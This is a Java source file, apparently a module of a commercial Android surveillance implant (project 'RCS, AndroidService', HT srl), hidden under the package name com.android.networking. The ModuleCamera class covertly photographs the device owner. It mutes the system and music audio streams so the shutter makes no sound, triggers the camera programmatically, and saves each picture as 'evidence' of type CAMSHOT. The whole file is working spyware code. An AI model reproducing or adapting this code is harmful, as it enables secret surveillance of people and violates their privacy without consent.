/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : CameraAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.module;

import java.io.IOException;
import java.util.logging.LogRecord;

import android.content.Context;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.ShutterCallback;
import android.media.AudioManager;
import android.view.SurfaceHolder;

import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.gui.AGUI;
import com.android.networking.interfaces.SnapshotManager;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

//SNIPPET http://marakana.com/forums/android/examples/39.html
/**
 * The Class ModuleCamera.
 */
public class ModuleCamera extends BaseInstantModule implements SnapshotManager {

	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$

	@Override
	public void actualStart() {
		try {
			snapshot();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (actualStart) Error: " + e);
			}
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(1000);
		return true;
	}

	/**
	 * Snapshot.
	 * 
	 * @throws IOException
	 */
	private synchronized void snapshot() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (snapshot)");
		}
		Status status = Status.self();

		if (status.gui != null) {
			status.gui.addPreview();
			Utils.sleep(1000);
			if (status.preview != null) {
				// status.gui.addPreview();
				if (status.preview.startCamera(this)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (snapshot), camera started :");
					}
					AudioManager audioManager = (AudioManager) Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);

					audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
					audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
					
					Status.self().preview.post(new Runnable() {
						@Override
						public void run() {
							Status.self().preview.click();
						}
					});
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (snapshot), null preview");
				}
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (snapshot), null gui :");
			}
		}
	}

	@Override
	public void onPictureTaken(byte[] paramArrayOfByte, Camera paramCamera) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onPictureTaken): " + paramArrayOfByte.length);
		}

		saveEvidence(paramArrayOfByte);

		Status.self().preview.stopCamera();
		Status.self().gui.removePreview();
	}

	private void saveEvidence(byte[] paramArrayOfByte) {
		EvidenceReference.atomic(EvidenceType.CAMSHOT, null, paramArrayOfByte);
	}

	@Override
	public void cameraReady() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (cameraReady),  :");
		}

		Status.self().preview.post(new Runnable() {
			@Override
			public void run() {
				Status.self().preview.click();
			}
		});
	}

}
